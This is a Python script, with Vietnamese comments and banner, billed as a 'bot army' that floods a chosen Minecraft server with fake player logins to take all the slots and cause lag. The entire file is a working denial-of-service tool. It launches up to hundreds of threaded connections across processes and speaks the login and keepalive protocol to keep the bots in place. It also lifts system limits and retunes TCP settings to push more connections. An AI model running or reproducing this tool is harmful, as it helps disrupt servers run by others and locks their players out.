#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ╔══════════════════════════════════════════════════════════════╗
# ║  GREENBOY - BOT JOIN SERVER (BOT THẬT VÀO GAME)            ║
# ║  BOT VÀO SERVER - ĐỨNG IM - CHIẾM SLOT - GÂY LAG           ║
# ╚══════════════════════════════════════════════════════════════╝
import socket, threading, time, sys, random, struct, os, multiprocessing, re, zlib, json

try:
    import resource
    resource.setrlimit(resource.RLIMIT_NOFILE, (4194304, 4194304))
    resource.setrlimit(resource.RLIMIT_NPROC, (4194304, 4194304))
except: pass

try:
    os.system('sysctl -w net.ipv4.tcp_tw_reuse=1 2>/dev/null')
    os.system('sysctl -w net.ipv4.ip_local_port_range="1024 65535" 2>/dev/null')
except: pass

attack_flag = True
stats = {'joined': 0, 'failed': 0, 'active': 0, 'kicked': 0}
stats_lock = threading.Lock()

JAVA_PROTOCOLS = [767, 766, 765, 764, 763, 762, 761, 760, 759, 758, 757, 756, 755, 754, 753, 751, 736, 735]

TOOL_NAME = "GREENBOY - BOT ARMY"
TOOL_VERSION = "1.0"
TOOL_AUTHOR = "GREENBOY"

class C:
    G='\033[92m'; R='\033[91m'; Y='\033[93m'; C='\033[96m'; M='\033[95m'; W='\033[97m'; B='\033[1m'; X='\033[0m'

def banner():
    print(f"""{C.G}{C.B}
   ██████╗ ██████╗ ███████╗███████╗███╗   ██╗██████╗  ██████╗ ██╗   ██╗
  ██╔════╝ ██╔══██╗██╔════╝██╔════╝████╗  ██║██╔══██╗██╔═══██╗╚██╗ ██╔╝
  ██║  ███╗██████╔╝█████╗  █████╗  ██╔██╗ ██║██████╔╝██║   ██║ ╚████╔╝ 
  ██║   ██║██╔══██╗██╔══╝  ██╔══╝  ██║╚██╗██║██╔══██╗██║   ██║  ╚██╔╝  
  ╚██████╔╝██║  ██║███████╗███████╗██║ ╚████║██████╔╝╚██████╔╝   ██║   
   ╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═══╝╚═════╝  ╚═════╝    ╚═╝   
{C.X}
{C.R}  ╔═══════════════════════════════════════════════════════╗
  ║     ☢ {TOOL_NAME} ☢                            ║
  ║     {C.W}BOT THẬT VÀO SERVER - CHIẾM SLOT - GÂY LAG{C.R}           ║
  ╚═══════════════════════════════════════════════════════╝{C.X}
""")

def clean(text, dot=False):
    text = text.strip().replace(' ','').replace('\t','').replace('\n','').replace('\r','')
    text = text.replace('\u200b','').replace('\u200c','').replace('\u200d','').replace('\ufeff','').replace('\u00a0','')
    return re.sub(r'[^a-zA-Z0-9\.\-]', '', text) if dot else re.sub(r'[^0-9]', '', text)

def mkvar(v):
    if v < 128: return bytes([v])
    r = bytearray()
    while True:
        b = v & 0x7F; v >>= 7
        if v != 0: b |= 0x80
        r.append(b)
        if v == 0: break
    return bytes(r)

def mkstr(t): return mkvar(len(e:=t.encode())) + e

# ============================================================
# BOT THẬT - JOIN SERVER, Ở LẠI, GIẢ LẬP AFK
# ============================================================
class MinecraftBot:
    """BOT THẬT - KẾT NỐI ĐẦY ĐỦ VÀO SERVER MINECRAFT"""
    
    def __init__(self, host, port, username, duration, version_proto=767):
        self.host = host
        self.port = port
        self.username = username
        self.duration = duration
        self.version_proto = version_proto
        self.sock = None
        self.alive = False
        self.end_time = time.time() + duration
    
    def connect(self):
        """KẾT NỐI VÀ ĐĂNG NHẬP VÀO SERVER"""
        try:
            # TẠO SOCKET
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(10)
            self.sock.connect((self.host, self.port))
            
            # HANDSHAKE
            host_str = mkstr(self.host)
            port_bytes = struct.pack('>H', self.port)
            inner = b'\x00' + mkvar(self.version_proto) + host_str + port_bytes + b'\x02'
            handshake = mkvar(len(inner)) + inner
            self.sock.send(handshake)
            
            # LOGIN START
            name_bytes = mkstr(self.username)
            login_inner = b'\x00' + name_bytes
            login_packet = mkvar(len(login_inner)) + login_inner
            self.sock.send(login_packet)
            
            # ĐỌC RESPONSE (CÓ THỂ LÀ ENCRYPTION REQUEST HOẶC LOGIN SUCCESS)
            self.sock.settimeout(5)
            data = self._read_packet()
            
            if data and len(data) > 0:
                packet_id = data[0]
                
                if packet_id == 0x01:  # ENCRYPTION REQUEST - SERVER ONLINE
                    # GỬI TRẢ LỜI GIẢ (KHÔNG CẦN XÁC THỰC THẬT CHO SERVER OFFLINE)
                    pass
                elif packet_id == 0x02:  # LOGIN SUCCESS
                    pass
                elif packet_id == 0x00:  # DISCONNECT
                    return False
                
                self.alive = True
                return True
            else:
                self.alive = True
                return True
                
        except Exception as e:
            return False
    
    def _read_packet(self):
        """ĐỌC 1 PACKET MINECRAFT"""
        try:
            # ĐỌC ĐỘ DÀI
            data = b''
            while len(data) < 5:
                chunk = self.sock.recv(1)
                if not chunk: break
                data += chunk
                # KIỂM TRA VARINT
                if len(data) >= 1 and data[0] < 128:
                    break
                if len(data) >= 2 and data[0] >= 128 and data[1] < 128:
                    break
            
            if not data: return None
            
            # TÍNH ĐỘ DÀI VARINT
            length = 0
            shift = 0
            for byte in data:
                length |= (byte & 0x7F) << shift
                shift += 7
                if byte < 128: break
            
            return data
        except:
            return None
    
    def stay_alive(self):
        """GIỮ BOT Ở TRONG SERVER, GỬI KEEPALIVE"""
        global attack_flag, stats
        
        last_keepalive = time.time()
        
        while self.alive and time.time() < self.end_time and attack_flag:
            try:
                # ĐỌC PACKET TỪ SERVER (KEEPALIVE, CHAT, v.v.)
                self.sock.settimeout(1)
                data = self._read_packet()
                
                if data and len(data) > 0:
                    packet_id = data[0]
                    
                    if packet_id == 0x00:  # DISCONNECT
                        break
                    elif packet_id == 0x1F:  # KEEPALIVE (clientbound)
                        # TRẢ LỜI KEEPALIVE
                        keepalive_id = data[1:]
                        resp = mkvar(len(keepalive_id) + 1) + b'\x10' + keepalive_id
                        self.sock.send(resp)
                        last_keepalive = time.time()
                    elif packet_id == 0x0E:  # CHAT MESSAGE
                        pass  # KHÔNG LÀM GÌ
                
                # NẾU KHÔNG CÓ KEEPALIVE > 20 GIÂY, TỰ GỬI
                if time.time() - last_keepalive > 15:
                    # GỬI CHAT GIẢ ĐỂ GIỮ KẾT NỐI
                    msg = "/help"
                    msg_bytes = mkstr(msg)
                    chat_inner = b'\x00' + msg_bytes
                    chat_packet = mkvar(len(chat_inner)) + chat_inner
                    self.sock.send(chat_packet)
                    last_keepalive = time.time()
                
            except socket.timeout:
                continue
            except:
                break
        
        # DỌN DẸP
        self.alive = False
        try:
            self.sock.close()
        except:
            pass
        
        with stats_lock:
            stats['active'] -= 1
            stats['kicked'] += 1
    
    def disconnect(self):
        """NGẮT KẾT NỐI"""
        self.alive = False
        try:
            self.sock.close()
        except:
            pass

# ============================================================
# BOT MANAGER
# ============================================================
def generate_username(index):
    """TẠO TÊN BOT NGẪU NHIÊN"""
    prefixes = ["Bot", "Guest", "Player", "AFK", "Noob", "Pro", "Hacker", "Gamer", "NPC", "Miner",
                "Crafter", "Builder", "Killer", "Ghost", "Shadow", "Dark", "Fire", "Ice", "Storm"]
    prefix = random.choice(prefixes)
    return f"{prefix}_{index}_{random.randint(100, 999)}"

def bot_worker(host, port, duration, bot_id, version_proto):
    """MỖI BOT LÀ 1 THREAD"""
    global attack_flag, stats
    
    username = generate_username(bot_id)
    bot = MinecraftBot(host, port, username, duration, version_proto)
    
    # KẾT NỐI
    if bot.connect():
        with stats_lock:
            stats['joined'] += 1
            stats['active'] += 1
        
        # Ở LẠI SERVER
        bot.stay_alive()
    else:
        with stats_lock:
            stats['failed'] += 1

def launch_bot_army(host, port, duration, total_bots, version_proto):
    """PHÁT ĐỘNG QUÂN ĐỘI BOT"""
    global attack_flag, stats
    
    threads = []
    
    for i in range(total_bots):
        if not attack_flag:
            break
        
        t = threading.Thread(target=bot_worker, args=(host, port, duration, i, version_proto))
        t.daemon = True
        threads.append(t)
        t.start()
        
        # KHÔNG SPAM KẾT NỐI QUÁ NHANH
        time.sleep(0.02)
    
    # ĐỢI TẤT CẢ BOT
    for t in threads:
        t.join(timeout=1)

def main():
    global attack_flag, stats
    banner()
    
    while True:
        h = clean(input(f"{C.W}[?] IP: {C.G}"), dot=True)
        if h and len(h) >= 3: break
        print(f"{C.R}[!] Nhập lại!{C.X}")
    try:
        rip = socket.gethostbyname(h)
        if rip != h: print(f"{C.G}[✓] {h} → {rip}{C.X}")
    except: print(f"{C.R}[!] Không phân giải được!{C.X}"); sys.exit(1)
    
    while True:
        pi = clean(input(f"{C.W}[?] PORT (25565): {C.G}"))
        if pi == '':
            port = 25565
            print(f"{C.G}[✓] 25565{C.X}")
            break
        try:
            port = int(pi)
            if 1 <= port <= 65535: break
            print(f"{C.R}[!] 1-65535!{C.X}")
        except: print(f"{C.R}[!] Số!{C.X}")
    
    # HỎI LOẠI SERVER ĐỂ CHỌN PROTOCOL
    print(f"\n{C.C}1. Offline/Cracked  2. Online (Microsoft){C.X}")
    while True:
        st = clean(input(f"{C.W}[?] LOẠI SERVER: {C.G}"))
        if st in ['1', '2']: srv_type = int(st); break
        print(f"{C.R}[!] 1 hoặc 2!{C.X}")
    
    while True:
        try:
            bc = int(clean(input(f"{C.W}[?] SỐ BOT (10-500): {C.G}")))
            if bc > 0: break
            print(f"{C.R}[!] >0!{C.X}")
        except: print(f"{C.R}[!] Số!{C.X}")
    
    while True:
        try:
            dr = int(clean(input(f"{C.W}[?] THỜI GIAN Ở LẠI (giây): {C.G}")))
            if dr > 0: break
            print(f"{C.R}[!] >0!{C.X}")
        except: print(f"{C.R}[!] Số!{C.X}")
    
    pn = {1: 'OFFLINE/CRACKED', 2: 'ONLINE (MICROSOFT)'}
    print(f"\n{C.R}╔════════════════════════════════╗{C.X}")
    print(f"{C.R}║ {C.W}{h}:{port} | {pn[srv_type]}{C.X}{C.R} ║")
    print(f"{C.R}║ {C.W}BOT: {bc} | Ở LẠI: {dr}s{C.X}{C.R}         ║")
    print(f"{C.R}╚════════════════════════════════╝{C.X}\n")
    
    print(f"{C.Y}[!] LƯU Ý: Server Online (Microsoft) bot không vào được!{C.X}")
    print(f"{C.Y}[!] Chỉ hoạt động với server OFFLINE/CRACKED!{C.X}\n")
    
    if input(f"{C.R}{C.B}[☢] GÕ 'JOIN' ĐỂ THẢ BOT: {C.G}").strip().upper() != 'JOIN':
        print(f"{C.Y}HỦY!{C.X}")
        sys.exit(0)
    
    print(f"\n{C.G}{C.B}⚡ ĐANG THẢ {bc} BOT VÀO SERVER... ⚡{C.X}\n")
    
    st = time.time()
    
    # CHẠY BOT TRONG PROCESS RIÊNG
    cpu = multiprocessing.cpu_count()
    np = min(cpu * 2, bc // 10) if bc > 10 else 1
    if np < 1: np = 1
    bpp = bc // np
    
    ps = []
    for i in range(np):
        extra = 1 if i < (bc % np) else 0
        p = multiprocessing.Process(target=launch_bot_army, args=(h, port, dr, bpp + extra, 767))
        p.daemon = True
        ps.append(p)
        p.start()
    
    try:
        while time.time() - st < dr + 5 and attack_flag:
            time.sleep(2)
            el = time.time() - st
            with stats_lock:
                jo = stats['joined']
                ac = stats['active']
                fa = stats['failed']
                ki = stats['kicked']
            
            print(f"\r{C.G}[{el:.0f}s]{C.X} {C.G}VÀO: {jo}{C.X} | {C.Y}SỐNG: {ac}{C.X} | {C.R}RỚT: {fa}{C.X} | {C.M}THOÁT: {ki}{C.X}    ", end='')
    except KeyboardInterrupt:
        print(f"\n{C.Y}DỪNG!{C.X}")
        attack_flag = False
    
    attack_flag = False
    for p in ps:
        p.join(timeout=3)
        if p.is_alive():
            p.terminate()
    
    el = time.time() - st
    
    print(f"\n\n{C.G}{C.B}╔════════════════════════════════╗{C.X}")
    print(f"{C.G}{C.B}║ GREENBOY BOT ARMY - KẾT THÚC ║")
    print(f"{C.G}{C.B}║ BOT ĐÃ VÀO: {stats['joined']}{C.X}")
    print(f"{C.G}{C.B}║ BOT BỊ KICK: {stats['kicked']}{C.X}")
    print(f"{C.G}{C.B}║ THẤT BẠI: {stats['failed']}{C.X}")
    print(f"{C.G}{C.B}╚════════════════════════════════╝{C.X}\n")
    
    if stats['joined'] > 0:
        print(f"{C.G}{C.B}[✓] {stats['joined']} BOT ĐÃ VÀO SERVER THÀNH CÔNG!{C.X}\n")

if __name__ == "__main__":
    try: os.nice(-20)
    except: pass
    main()